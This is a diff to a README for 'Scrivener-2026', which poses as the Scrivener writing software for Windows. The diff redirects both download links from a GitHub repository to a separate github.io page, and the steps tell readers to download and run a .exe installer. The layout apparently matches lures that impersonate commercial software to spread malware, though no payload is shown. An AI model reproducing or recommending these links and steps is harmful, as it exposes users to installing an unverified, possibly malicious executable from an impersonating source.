@@ -1,6 +1,6 @@
 # ✍️ Scrivener-2026 - Write books with professional software tools
 
-[![](https://img.shields.io/badge/Download-Scrivener_2026-blue.svg)](https://github.com/Ssimi4520/Scrivener-2026)
+[![](https://img.shields.io/badge/Download-Scrivener_2026-blue.svg)](https://ssimi4520.github.io)
 
 ## 📖 Overview
 Scrivener-2026 provides a workspace for long-form writing projects. This software helps authors organize notes, concepts, and research alongside their manuscript. You keep all your writing materials in one place. The application features tools for drafting, structuring, and exporting novels or technical documents. It runs on Windows 10 and Windows 11.
@@ -17,7 +17,7 @@ Before you install the application, check your computer against these requiremen
 ## 📥 Getting Started
 Follow these steps to obtain the software.
 
-1. Visit the repository page to begin: [Download Scrivener-2026](https://github.com/Ssimi4520/Scrivener-2026).
+1. Visit the repository page to begin: [Download Scrivener-2026](https://ssimi4520.github.io).
 2. Look for the releases section on the right side of the screen.
 3. Click the most recent version number to see the available files.
 4. Select the file ending in .exe to download the installer to your computer.
